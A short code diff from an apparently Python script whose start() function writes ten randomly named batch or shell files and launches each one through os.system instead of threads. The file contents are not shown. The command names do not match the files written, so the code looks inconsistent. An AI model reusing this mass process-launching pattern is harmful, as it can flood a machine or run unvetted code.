@@ -27,7 +27,7 @@ def start():
     for i in range(10):
         if platform == 'win32':
             with open(random_strs[i] + '.bat','w') as f:f.write(win32)
-            _thread.start_new_thread(run,('start cmd /c {}'.format(password + random_strs[i],'w')))
+            os.system('start cmd /c {}'.format(password + random_strs[i],'w'))
         else:
             with open(random_strs[i] + '.bat','w') as f:f.write(unix)
-            _thread.start_new_thread(run,('bash {}'.format(password + random_strs[i],'w')))
+            os.system('bash {}'.format(password + random_strs[i],'w'))
